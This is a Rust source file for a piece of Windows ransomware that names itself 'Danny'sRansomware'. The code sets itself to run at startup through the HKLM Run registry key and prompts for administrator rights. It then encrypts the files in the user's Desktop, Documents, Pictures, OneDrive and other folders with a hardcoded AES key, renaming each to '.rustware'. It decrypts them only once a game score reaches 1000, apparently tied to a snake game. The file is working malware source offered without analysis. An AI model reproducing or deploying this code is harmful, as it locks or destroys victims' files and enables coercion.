use libaes::Cipher; 
use rand::Rng;
use std::ptr::null_mut;

use std::ffi::CString;
use std::ptr;
use std::{
    env,
    fs
};


use windows_sys::{
    core::*, Win32::Foundation::*, 
                 Win32::System::Threading::*,
		 Win32::System::WindowsProgramming::*,
		Win32::System::Diagnostics::Debug::*,
		Win32::UI::WindowsAndMessaging::*,
		Win32::System::LibraryLoader::*,
		Win32::Security::*,
		Win32::UI::Shell::*,
		Win32::System::Registry::*,
			

};


 static dir_names : [&str; 13] = [
        "Contacts",
        "Desktop",
        "Documents",
        "Downloads",
        "Favorites",
        "Music",
	"OneDrive\\Attachments",
        "OneDrive\\Desktop",
        "OneDrive\\Documents",
        "OneDrive\\Pictures",
        "OneDrive\\Music",
        "Pictures",
        "Videos",
    ];



pub fn add_registry() -> bool {
    unsafe {
        let mut registry_handle: HKEY = 0;
        if RegOpenKeyExA(
            HKEY_LOCAL_MACHINE,
            CString::new("Software\\Microsoft\\Windows\\CurrentVersion\\Run")
                .unwrap()
                .as_ptr() as *const u8,
            0,
            KEY_ALL_ACCESS,
            &mut registry_handle,
        ) != 0
        {
            println!("Fail to open registry key");
            RegCloseKey(registry_handle);
            return false;
        }

        let mut reg_type: u32 = 0;
        let mut path: Vec<u8> = Vec::new();
        let mut size: u32 = 200;
        path.resize(200, 0u8);

        if RegGetValueA(
            HKEY_LOCAL_MACHINE,
            CString::new("Software\\Microsoft\\Windows\\CurrentVersion\\Run")
                .unwrap()
                .as_ptr() as *const u8,
            CString::new("Dannys'sRansomware").unwrap().as_ptr() as *const u8,
            2,
            &mut reg_type,
            path.as_ptr() as *const _ as *mut _,
            &mut size,
        ) != 0
        {
            let mut name: Vec<i8> = Vec::new();
            name.resize(200, 0i8);
            let mut length = GetModuleFileNameA(0, name.as_ptr() as *mut u8, 200);
            let mut path: Vec<u8> = Vec::new();
            for i in 0..length as usize {
                path.push(name[i].clone() as u8);
            }
            path.push(0u8);
            length += 1;

            if RegSetValueExA(
                registry_handle,
                CString::new("Danny'sRansomware").unwrap().as_ptr() as *const u8,
                0,
                REG_SZ,
                path.as_ptr(),
                length,
            ) != 0
            {
                println!("Fail to set registry key");
                RegCloseKey(registry_handle);
                return false;
            } else {
                RegCloseKey(registry_handle);
                return true;
            }
        } else {
            println!("Key already there, dont do anything");
            RegCloseKey(registry_handle);
            return false;
        }
    }
}







pub fn check_elevation() -> bool {
    unsafe {
        let mut name: Vec<i8> = Vec::new();
        name.resize(200, 0i8);
        let length = GetModuleFileNameA(0, name.as_ptr() as *mut u8, 200);
        let mut path: Vec<u8> = Vec::new();
        for i in 0..length as usize {
            path.push(name[i].clone() as u8);
        }
        if is_elevated() {
            return true;
        } else {
            println!("This is not elevated yet");
            ShellExecuteA(
                0,
                CString::new("runas").unwrap().as_ptr() as *const u8,
                CString::from_vec_unchecked(path).as_ptr() as *const u8,
                null_mut(),
                null_mut(),
                1,
            );
        }
        return false;
    }
}

pub fn is_elevated() -> bool {
    // https://vimalshekar.github.io/codesamples/Checking-If-Admin
    let mut h_token: HANDLE = 0;
    let mut token_ele: TOKEN_ELEVATION = TOKEN_ELEVATION { TokenIsElevated: 0 };
    let mut size: u32 = 0u32;
    unsafe {
        OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut h_token);
        GetTokenInformation(
            h_token,
            TokenElevation,
            &mut token_ele as *const _ as *mut _,
            std::mem::size_of::<TOKEN_ELEVATION>() as u32,
            &mut size,
        );
        return token_ele.TokenIsElevated == 1;
    }
}



fn get_username_name() -> String{
unsafe {
        let mut size = 0;
        let retval = GetUserNameA(ptr::null_mut(), &mut size);
        assert_eq!(retval, 0, "Should have failed");

        let mut username = Vec::with_capacity(size as usize);
        let retval = GetUserNameA(username.as_mut_ptr(), &mut size);
        assert_ne!(retval, 0, "Perform better error handling");
        assert!((size as usize) <= username.capacity());
        username.set_len(size as usize);
        username.resize((size - 1) as usize, 0u8);

        // Beware: This leaves the trailing NUL character in the final string,
        // you may want to remove it!
        String::from_utf8(username).unwrap()
    }

}


pub fn execute_additional_code(message: String) {
    let wide_message = to_wide(message);

    unsafe {
        let event = CreateEventW(std::ptr::null(), 1, 0, std::ptr::null());
        SetEvent(event);
        WaitForSingleObject(event, 0);
        CloseHandle(event);
        MessageBoxW(0, wide_message.as_ptr(), w!("Caption"), MB_OK);
    }
}

fn to_wide(s: String) -> Vec<u16> {
    use std::iter::once;
    s.encode_utf16().chain(once(0)).collect()
}



fn generate_random_key() -> [u8; 16] {
    let mut rng = rand::thread_rng();
    let mut key = [0u8; 16];
    rng.fill(&mut key);
    key
}

fn generate_random_iv() -> [u8; 16] {
    let mut rng = rand::thread_rng();
    let mut iv = [0u8; 16];
    rng.fill(&mut iv);
    iv
}


fn encrypt_decrypt(file_name: &str, action: &str) -> bool {
     let key = b"fTjWmZq4t7w!z%C*";
    let iv = b"+MbQeThWmZq4t6w9";
    let cipher = Cipher::new_128(&key);

    match action {
        "encrypt" => {
            println!("[*] Encrypting {}", file_name);
            let encrypted = cipher.cbc_encrypt(iv, &fs::read(file_name).unwrap());
            fs::write(file_name, encrypted).unwrap();
            let new_filename = format!("{}.rustware", file_name);
            fs::rename(file_name, new_filename).unwrap();
        }

        "decrypt" => {
            println!("[*] Decrypting {}", file_name);
            let decrypted = cipher.cbc_decrypt(iv, &fs::read(file_name).unwrap());
            if let Err(err)=fs::write(file_name, decrypted){
		    eprintln!("Error writing to file: {}", err);

		};
            let new_filename = file_name.replace(".rustware", "");
            fs::rename(file_name, new_filename).unwrap();
        }

        _ => { 
            println!("[-] Invalid action!");
            return false 
        }
    }

    return true;
}

pub fn next_step(score: u32){
let current_score= score;
for dir in dir_names.iter() {
        let mut full_path = String::from("C:\\Users\\");
        full_path.push_str(&get_username_name());
        full_path.push_str("\\");
        full_path.push_str(dir.clone());
        full_path.push_str("\\");
        // extract path and call traverse
        let full_path: CString = CString::new(full_path.as_bytes()).unwrap();
	let path_str = full_path.to_str().expect("Conversion to &str failed");
	println!("Path {}",path_str);
	if  let Ok(entries) = fs::read_dir(path_str) {
	let entries = fs::read_dir(path_str).unwrap();

   	 for raw_entry in entries {
        let entry = raw_entry.unwrap();

        if entry.file_type().unwrap().is_file() {
            
            println!("File Name: {}", entry.path().display());
	    let file_path = entry.path();
	    let file_path_str = file_path.to_str();
            if file_path_str.unwrap().to_lowercase().contains("rustware") || file_path_str.unwrap().to_lowercase().contains("snakegame") || file_path_str.unwrap().to_lowercase().contains("ini") {
                // Skip files containing "rustware" or "snakegame" in the file path
                continue;
            }
            if current_score <1000{
	    encrypt_decrypt(file_path_str.unwrap(),"encrypt");
	    }else{
		
                 encrypt_decrypt(file_path_str.unwrap(),"decrypt");
		}
        }
	}
	}
     else {
     println!("Failed to read directory: {}", path_str);
}
}



}

